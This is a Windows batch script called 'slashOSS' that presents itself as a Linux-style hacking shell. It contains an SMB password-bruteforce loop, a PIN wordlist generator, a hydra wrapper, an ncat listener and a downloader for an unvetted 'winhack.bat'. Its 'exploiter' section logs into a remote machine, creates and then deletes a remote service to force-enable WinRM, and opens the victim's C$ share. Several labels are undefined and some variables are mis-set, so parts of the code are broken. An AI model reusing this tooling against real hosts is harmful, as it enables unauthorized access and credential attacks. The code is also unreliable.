@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title slashOSS
mode con cols=80 lines=30

:cmd
set /p "type= [7m{살해자}:[0m"

%type%

if "%type%" EQU "ls" ( dir )
if "%type%" EQU "ls -d" ( dir | find "<DIR>" )
if "%type%" EQU "ls -exe" ( dir | find ".exe" )
if "%type%" EQU "ls -d -exe" ( goto secondoption )
if "%type%" EQU "pwd" ( goto pwd )
if "%type%" EQU "clear" ( cls )
if "%type%" EQU "ifconfig" ( ipconfig | find "IPv4" )
if "%type%" EQU "bruteforce" ( goto bruteforce )
if "%type%" EQU "passwd" ( goto passwd )
if "%type%" EQU "neofetch" ( goto neofetching )
if "%type%" EQU "pacman" ( goto error )
if "%type%" EQU "pacman nmap -y" ( goto nmap-install )  
if "%type%" EQU "create wordlist" ( goto createw )
if "%type%" EQU "pacman msfconsole -y" ( goto metasploit-install )
if "%type%" EQU "pacman notpadpp -y" ( goto notpadpp-install )
if "%type%" EQU "pacman python3 -y" ( goto python3-install )  
if "%type%" EQU "pacman hydra -y" ( goto hydra-install )
if "%type%" EQU "h" ( goto commandlist )
if "%type%" EQU "xterm" ( goto xterminal )
if "%type%" EQU "back" ( cd .. )
if "%type%" EQU "pacman winhack -y" ( goto winhack-install ) 
if "%type%" EQU "winhack" ( winhack.bat )
if "%type%" EQU "xrdp" ( goto xrdp )
if "%type%" EQU "msfconsole" ( goto msfconsole )
if "%type%" EQU "hydra" ( goto hydra )
if "%type%" EQU "nc" ( goto nc-listener )
if "%type%" EQU "exploiter" ( goto exploiter )
if "%type%" EQU "pacman putty -y" ( goto putty-install )
if "%type%" EQU "shutdown now" ( shutdown /s /t 0 )
if "%type%" EQU "sudo su" ( powershell "start cmd -verb runas" )
if "%type%" EQU "sniff" ( goto sniffer )

goto cmd



:pwd
echo current path:
cd
goto cmd


:neofetching
cls
echo       ^|^ 
echo #=====^|^#================\
echo #=====^|^#================/
echo       ^|^


systeminfo | find "Host Name"
systeminfo | find "[01]"
systeminfo | find "[02]"

pause > nul
goto cmd


:bruteforce
cls
set /p hostname="hostname>"
set /p username="username>"
set /p wordlist="wordlist>"

set /a count=1
for /f %%a in ( %wordlist% ) do (
set passwd=%%a
call :attempt
) 

:attempt
net use \\%hostname% /user:%username% %passwd% >nul 2>&1
echo ([32m%count%[0m)password:[32m%passwd%[0m
set /a count=%count%+1
goto cmd


:error
cls 
echo u have missed a argument
echo example:  pacman <name> -y 
goto cmd


:nmap-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl https://nmap.org/dist/nmap-7.95-setup.exe -o nmap-7.95-setup.exe.exe 
nmap-7.95-setup.exe 
goto cmd


:createw
for /L %%a in (1000,1,9999) do (

echo creation wordlist...
echo %%a >> word.txt
)
goto cmd


:metasploit-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe -o msfconsole-installer.exe
msfconsole-installer.exe
goto cmd


:notpadpp-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.1/npp.8.7.1.Installer.x64.exe -o notpadpp.exe
notpadpp.exe
goto cmd


:hydra-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl -L -o hydra.zip https://github.com/maaaaz/thc-hydra-windows/archive/master.zip
tar -xf hydra.zip
goto cmd


:python3-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe -o python-3.13.0-amd64.exe
python-3.13.0-amd64.exe
goto cmd

:putty-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl https://the.earth.li/~sgtatham/putty/latest/wa64/putty.exe 
putty.exe
goto cmd


:secondoption
dir | find "<DIR>" 
dir | find ".exe" 
goto cmd



:commandlist
cls
echo [7mslashOSS [0m command list
echo.
echo [7mls[0m
echo [7mclear[0m
echo [7mpwd[0m 
echo [7mifconfig[0m
echo [7mpacman[0m
echo [7mneofetch[0m
echo [7mcreate wordlist[0m
echo [7mbruteforce[0m
echo [7mpasswd[0m
echo [7mmsfconsole[0m
echo [7mhydra[0m
echo [7mnc[0m
echo [7mwinhack[0m
echo [7mexploiter[0m
echo [7msudo su[0m
echo [7msniff [0m
pause > nul
cls
goto cmd


:passwd
set /p username="username>"
cls
set /p password="new password>"
net user %username% %password% > nul
echo password changed with successfull!
goto cmd


:xterminal
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; $mainForm = New-Object System.Windows.Forms.Form; $mainForm.Text = 'slashOSS'; $lbl = New-Object System.Windows.Forms.Label; $lbl2 = New-Object System.Windows.Forms.Label; $lbl.Text = 'Hello World\n'; $lbl2.Text = 'Hello World\n'; $mainForm.Controls.Add($lbl); $mainForm.Controls.Add($lbl2); $mainForm.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen; $mainForm.ShowDialog()}"
goto cmd



:winhack-install
cls
echo      ########
echo     ##########
echo     ###
echo     ##########
echo      #######
echo     download...
curl -L https://github.com/SL4Y3RO4/winhack/blob/main/winhack.bat -o winhack.bat
goto cmd


:msfconsole
cd C:\metasploit
console.bat
goto cmd


:hydra
cd thc-hydra-windows-master

set /p username="username>"
set /p hostname="hostname>"
set /p wordlist="wordlist>"
set /p wordlist="protocol>"

hydra -l %username% -P %wordlist% %hostname% %protocol%  
goto cmd


:nc-listener
cls
cd C:\Program Files (x86)\Nmap
ncat -lvp %RANDOM%
goto cmd


:exploiter
set /p "command= [7m{살해자/exploiter}0══|#====>[0m"

%command%

if "%command%" EQU "bye" ( goto cmd )
if "%command%" EQU "ls" ( dir )
if "%command%" EQU "clear" ( cls )
if "%command%" EQU "exploit" ( goto exploit )

goto exploiter


:exploit
set  servicename=winrm%random%

set /p username="username>"
set /p hostname="hostname>"
set /p password="password>"
rem remote access
net use \\%hostname% /user:%username% %password% > nul 2>&1
net use \\%hostname% /user:%username% %password% > nul 2>&1

if /I "%errorlevel%" NEQ "0" ( 

    echo access denied. Credentials incorrect
    pause > nul
    goto main
)

echo connection done with successfull!

:winrm
echo Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %hostname%" >nul 2>&1
chcp 65001 >nul

if /I "%errorlevel%" NEQ "0" (
  echo Creating Remote Service...
  rem Creates a service on the remote PC that enables WinRM
  sc \\%hostname% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo Configuring WinRM...
  sc \\%hostname% start %servicename%
  rem erase
  echo %servicename% 
  sc \\%hostname% delete %servicename%
  goto menu
)

if /I "%errorlevel%" NEQ "0" (
  chcp 65001 >nul
  echo %hostname% has WinRM Enabled!
  timeout /t 3 >nul
  goto option
)

:option
cls
echo connected to %hostname%
echo. 
echo 1 go to file system
echo 2 go to main display
echo 3 create a payload
echo 4 shutdown the machine
echo.
choice /c:1234 /n /m "0══|#====>"

if %errorlevel% == 1 ( goto filez )
if %errorlevel% == 2 ( goto back )
if %errorlevel% == 3 ( goto payload )
if %errorlevel% == 4 ( goto shut )

:filez
start "" "\\%hostname%\C$"
cls
goto option

:payload
start "" "\\%hostname%\C$\users\"
goto nano

:nano
set /p filename="file name & extension: "
goto loop



:sniffer
echo ##########0##########
netstat -nbf | findstr "TCP"
goto cmd